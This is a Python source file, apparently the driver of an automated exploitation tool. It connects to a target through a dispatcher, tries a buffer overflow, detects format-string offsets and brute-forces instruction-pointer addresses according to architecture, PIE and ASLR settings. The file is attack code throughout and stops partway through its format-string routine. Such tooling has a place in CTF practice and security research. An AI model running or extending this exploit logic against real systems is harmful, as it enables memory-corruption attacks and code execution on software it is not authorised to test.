import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))

from exploit.bof_exploit import OverflowExploit
from exploit.string_bug import FormatStringExploit
from dispatcher import Dispatcher

class Exploit:
    def __init__(self, config : dict[str, str | bool | int]):
        self.config : dict[str, str | bool | int] = config
        self.dispatcher : Dispatcher = Dispatcher(self.config)
        if not self.dispatcher.is_connected():
            self.dispatcher.connect()

    def run_bof_exploit(self):
        bof_exploit = OverflowExploit(self.config, self.dispatcher)
        bof_index = bof_exploit.try_overflow()
        return bof_index

    def run_string_bug_exploit(self):
        string_exploit = FormatStringExploit(self.config, self.dispatcher)
        str_offset, str_stack_alignment = string_exploit.find_offset(max_offset=100)
        if str_offset == None or str_stack_alignment == None:
            print("[-] No string bug format detected")
            return
        
        print(f"[+] String bug format detected with offset: {str_offset} and stack alignment: {str_stack_alignment}")

        print(f"[+] Trying to find stack addresses...")

        # addresses = string_exploit.return_stack_addresses()

        # if not self.dispatcher.aslr_enabled() or self.dispatcher.is_infinite_loop():
        #     stack_ip = string_exploit.find_instruction_pointer_in_stack(addresses=addresses)
        #     if stack_ip:
        #         print(f"[+] Instruction pointer found at address: {hex(stack_ip)}")
        #         return stack_ip
            
        print(f"[-] No instruction pointer found in stack addresses")
        # Try brute to find a way to overwrite the instruction pointer using .text section range

        print(f"[+] Trying to brute force the instruction pointer address...")

        if self.dispatcher.pie_enabled() and self.dispatcher.is_infinite_loop():
            if self.dispatcher.get_arch() == "i386":
                text_range = (0x08000000, 0xc0000000)
            elif self.dispatcher.get_arch() == "x86_64":
                text_range = (0x4000000000, 0x7fffffffffff)
        elif not self.dispatcher.pie_enabled():
            if self.dispatcher.get_arch() == "i386":
                text_range = (0x08048000, 0x08049000)
            elif self.dispatcher.get_arch() == "x86_64":
                text_range = (0x400000, 0x402000)
        stack_ip = string_exploit.find_instruction_pointer_bruteforce(range_address=text_range)
            